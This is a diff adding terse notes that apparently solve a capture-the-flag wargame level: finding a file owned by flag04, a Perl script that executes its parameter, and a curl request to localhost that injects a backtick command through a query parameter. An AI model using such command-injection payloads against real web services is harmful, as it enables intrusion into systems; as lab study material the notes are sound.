@@ -1,0 +1,7 @@
+find -user flag04
+
+found file level04.pl
+
+File takes in parameter and prints the output of the execution.
+
+curl 'localhost:4747?x=`getflag`'
